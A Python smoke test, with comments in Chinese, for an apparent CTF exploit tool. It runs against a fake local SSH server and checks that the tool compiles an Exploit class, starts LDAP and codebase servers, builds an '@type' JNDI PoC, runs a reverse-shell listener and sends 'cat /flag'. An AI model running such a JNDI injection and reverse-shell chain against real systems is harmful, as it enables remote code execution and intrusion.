"""web.jndi 工具冒烟测试。

用本地 paramiko 假 SSH 服务器（密码认证 + exec + SFTP 子系统）验证
PlinkClient 与 JndiExploitTool 的完整编排：
- plink 首次连接的主机密钥接受流程（非 batch 应答 y -> 缓存 -> batch 重试）
- plink 远程命令执行 / pscp 文件上传（SCP 协议回退 SFTP）
- 工具全流程：环境检查 -> 部署 -> 编译 -> 启动服务 -> 生成 PoC -> 等待 -> 清理

运行方式（不依赖 pytest）:
    python tests/test_web_jndi_smoke.py

依赖: paramiko（本机已装）、D:\\putty（plink.exe / pscp.exe）。
"""
import asyncio
import base64
import re
import socket
import sys
import threading
import time
from pathlib import Path

import paramiko

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "tools" / "web"))

from app.core.tool import ToolContext  # noqa: E402
from jndi import JndiExploitTool, PlinkClient, _find_exe  # noqa: E402

PUTTY_DIR = r"D:\putty"
SSH_PORT = 2222
SSH_USER = "test"
SSH_PASS = "secret123"
HOST_KEY = paramiko.RSAKey.generate(2048)

STATE: dict = {"files": {}, "commands": []}


class StubHandle(paramiko.SFTPHandle):
    """pscp 写文件用的内存句柄。"""

    def __init__(self, path: str):
        super().__init__()
        self.path = path
        self.buf = b""

    def write(self, offset: int, data: bytes):
        self.buf = self.buf[:offset] + data
        return paramiko.SFTP_OK

    def close(self):
        STATE["files"][self.path] = self.buf
        return paramiko.SFTP_OK

    def stat(self):
        st = paramiko.SFTPAttributes()
        st.st_size = len(self.buf)
        return st


class FakeSftp(paramiko.SFTPServerInterface):
    def __init__(self, server, *args, **kwargs):
        super().__init__(server, *args, **kwargs)
        self._handles = {}

    def open(self, path, flags, attr):
        # SFTPServer 要求 open() 返回 SFTPHandle 实例，否则被当作错误码
        h = StubHandle(path)
        self._handles[h] = True
        return h

    def stat(self, path):
        st = paramiko.SFTPAttributes()
        st.st_size = len(STATE["files"].get(path, b""))
        return st

    lstat = stat


class FakeServer(paramiko.ServerInterface):
    sftp_si = FakeSftp

    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        ok = username == SSH_USER and password == SSH_PASS
        return paramiko.AUTH_SUCCESSFUL if ok else paramiko.AUTH_FAILED

    def check_channel_exec_request(self, channel, command):
        cmd = command.decode(errors="replace")
        STATE["commands"].append(cmd)
        if "echo OK" in cmd:
            # 只模拟连接检查的输出；其他命令（依赖检查/端口检查/启动服务）
            # 保持静默，避免污染工具对 stdout 的解析
            channel.send(b"OK\n")

        def finish():
            # 模仿 OpenSSH 的优雅关闭：exit-status -> EOF -> 等客户端 EOF -> close
            channel.send_exit_status(0)
            time.sleep(0.5)
            try:
                channel.shutdown_write()
                channel.settimeout(2)
                while channel.recv(1024):
                    pass
            except Exception:  # noqa: BLE001
                pass
            try:
                channel.close()
            except Exception:  # noqa: BLE001
                pass

        threading.Thread(target=finish, daemon=True).start()
        return True

    def check_channel_subsystem_request(self, channel, name):
        if name == "sftp":
            # SFTPServer 是 SubsystemHandler（threading.Thread），必须显式
            # start() 才会发送 SFTP VERSION 并进入收包循环
            # （与 ServerInterface 默认实现的行为一致）。
            handler = paramiko.SFTPServer(channel, name, self, self.sftp_si)
            handler.start()
            return True
        return False


def _serve(port: int) -> None:
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("127.0.0.1", port))
    sock.listen(5)
    transports = []
    while True:
        conn, _ = sock.accept()
        try:
            t = paramiko.Transport(conn)
            t.add_server_key(HOST_KEY)
            t.start_server(server=FakeServer())
            transports.append(t)
        except Exception as exc:  # noqa: BLE001 — 客户端主动断开（如 plink 主机密钥探测）属正常
            print(f"server conn err: {exc}")


async def main() -> None:
    if not _find_exe(PUTTY_DIR, "plink") or not _find_exe(PUTTY_DIR, "pscp"):
        print(f"SKIP: 未找到 {PUTTY_DIR} 下的 plink.exe/pscp.exe")
        return

    threading.Thread(target=_serve, args=(SSH_PORT,), daemon=True).start()
    time.sleep(0.5)

    client = PlinkClient("127.0.0.1", SSH_PORT, SSH_USER, SSH_PASS, PUTTY_DIR)

    # 1) 首次连接：主机密钥未缓存 -> 自动接受 -> exec 成功
    code, out, err = await client.exec("echo OK", timeout=30)
    assert code == 0, f"exec 失败: code={code} out={out!r} err={err!r}"
    assert "OK" in out, f"echo OK 输出异常: {out!r}"
    print("1) plink 主机密钥接受 + exec 通过")

    # 2) pscp 上传（-scp 会失败回退 -sftp，两条路径都要走通）
    src = ROOT / "test_upload.txt"
    src.write_text("hello jndi smoke test")
    code, msg = await client.put_text(src, "/tmp/up.txt")
    assert code == 0, f"pscp 上传失败: {msg}"
    assert STATE["files"].get("/tmp/up.txt") == b"hello jndi smoke test"
    print("2) pscp 上传（SFTP 回退）通过")

    # 3) 工具全流程编排（假服务器不提供真实 javac/nc，验证流程与输出结构）
    ctx = ToolContext(
        executor=None,
        workdir=ROOT / "data" / "work" / "smoke_jndi",
        artifacts_dir=ROOT / "data" / "artifacts" / "smoke_jndi",
    )
    tool = JndiExploitTool()
    result = await tool.run(
        {
            "ssh_host": "127.0.0.1",
            "ssh_port": SSH_PORT,
            "ssh_user": SSH_USER,
            "ssh_pass": SSH_PASS,
            "putty_dir": PUTTY_DIR,
            "target_url": "",  # 不自动发送 PoC
            "command": "cat /flag",
            "wait_time": 5,
            "cleanup": True,
        },
        ctx,
    )
    print("=== 工具输出 ===")
    print(result.stdout)
    assert result.status.value == "success", f"状态异常: {result.status} {result.stderr}"
    assert '"@type": "java.lang.Class"' in result.data["poc"]
    cls_name = result.data["class_name"]
    assert re.fullmatch(r"Exploit[a-z0-9]{8}", cls_name), f"类名未随机化: {cls_name!r}"
    assert f"ldap://127.0.0.1:1389/{cls_name}" in result.data["poc"]
    assert result.data["codebase"] == "http://127.0.0.1:8888/"
    cmds = STATE["commands"]
    assert any(re.search(rf"javac (--release 8 )?{cls_name}\.java", c) for c in cmds), "缺少 javac 编译步骤"
    assert any("nohup python3" in c and "ldap_server.py" in c for c in cmds), "缺少 LDAP 服务启动"
    assert any("reverse_listener.py" in c and "31339" in c for c in cmds), "缺少反弹监听器启动（替代 nc 单连接竞态）"
    assert not any(re.search(r"cd \S+ && nohup", c) for c in cmds), "启动命令使用了会挂起 plink 的后台 AND-列表"
    fifo_cmd = [c for c in cmds if "sleep 999999" in c][0]
    assert "3<>" in fifo_cmd and "/rev.fifo" in fifo_cmd, (
        "fifo 保活未用 3<> 挂在 fd 3（<> 只作用于 fd 0，会被后面的 </dev/null 覆盖导致 fifo 无人持有、nc 卡死）"
    )
    assert "</dev/null >/dev/null 2>&1" in fifo_cmd, "sleep 的 stdout 未重定向（会占住 SSH channel 导致 plink 挂死）"
    assert any("rm -rf /tmp/ctf-jndi-" in c for c in cmds), "缺少清理步骤"
    print("3) 工具全流程编排通过")

    # 4) 下发命令必须带行结束符（shell 读到换行才会执行）
    await JndiExploitTool._send_command(client, "/tmp/ctf-jndi-smoke", "cat /flag")
    sent = [c for c in STATE["commands"] if "base64 -d >" in c][-1]
    m = re.search(r"echo (\S+) \| base64 -d", sent)
    assert m, "未找到下发命令"
    assert base64.b64decode(m.group(1)).decode() == "cat /flag\n", "下发命令缺少行结束符"
    print("4) 下发命令换行符检查通过")

    src.unlink(missing_ok=True)
    print("冒烟测试全部通过")


if __name__ == "__main__":
    asyncio.run(main())
